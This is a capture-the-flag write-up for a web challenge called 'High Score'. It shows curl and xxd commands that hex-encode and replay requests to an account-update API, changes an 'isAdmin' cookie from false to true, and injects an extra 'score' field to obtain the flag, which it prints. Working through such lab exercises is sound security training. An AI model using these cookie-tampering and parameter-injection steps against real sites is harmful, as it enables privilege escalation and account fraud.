# Web Framework & API Vulnerabilities High Score

Visiting the site at **http://141.85.224.115:7001/**, we found a simple login and registration form. Inspecting the HTML, we discovered that once logged in, we are redirected to /account.php, which allows us to: View our score and user info Submit updated username/email via an AJAX POST request to /api-save-user.php

```js
var data = 'username='+username+'&email='+email;
data = a2hex(data);
$.ajax({
  type: "POST",
  url: "api-save-user.php",
  data: {q: data},
  success: function(data) {
    console.log(data);
  }
});
```

- The data is hex-encoded client-side before being sent.
- No CSRF tokens or validation observed.

We decoded and crafted our own **POST** requests to **api-save-user.php**:

```bash
echo -n 'username=dada&email=xenowave1@gmail.com' | xxd -p
```

Which returned: ***757365726e616d653d6461646126656d61696c3d78656e6f776176653140676d61696c2e636f6d***

```bash
curl -X POST http://141.85.224.115:7001/api-save-user.php \
  -d 'q=<HEX_STRING>' \
  -b "PHPSESSID=<session>"
```

Response: ["Success! Your info has been saved!"]

While inspecting cookies, we noticed a cookie: **isAdmin=false**.

We manually modified it to: **isAdmin=true**.

And reloaded **/account.php** — it looked visually identical, but we suspected this cookie may unlock some backend functions.

We then tried submitting extra parameters, like a score field:

```bash
username=test&email=test@gmail.com&score=1
```

Encoded and submitted:

```bash
echo -n 'username=test&email=test@gmail.com&score=1' | xxd -p
```

It was accepted by the API: **["Success! Your info has been saved!"]**
But the leaderboard did not reflect the updated score only when the cookie was true.. and we got the flag: **SSS{the_greatest_0f_them_all}**
